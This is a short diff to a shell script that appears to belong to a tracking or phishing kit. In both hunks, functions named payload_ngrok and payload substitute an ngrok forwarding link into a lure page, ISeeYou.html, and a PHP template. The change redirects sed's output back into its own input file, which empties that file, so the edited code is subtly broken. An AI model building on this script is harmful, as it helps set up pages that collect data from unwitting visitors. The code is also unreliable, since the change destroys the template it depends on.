@@ -114,7 +114,7 @@ payload_ngrok() {
     return 1
   fi
   
-  sed "s|forwarding_link|$link|g" ISeeYou.html > index2.html 2>/dev/null
+  sed "s|forwarding_link|$link|g" ISeeYou.html > ISeeYou.html 2>/dev/null
   sed "s|forwarding_link|$link|g" template.php > index.php 2>/dev/null
   return 0
 }
@@ -184,7 +184,7 @@ payload() {
     return 1
   fi
   
-  sed "s|forwarding_link|$send_link|g" ISeeYou.html > index2.html 2>/dev/null
+  sed "s|forwarding_link|$send_link|g" ISeeYou.html > ISeeYou.html 2>/dev/null
   sed "s|forwarding_link|$send_link|g" template.php > index.php 2>/dev/null
   return 0
 }
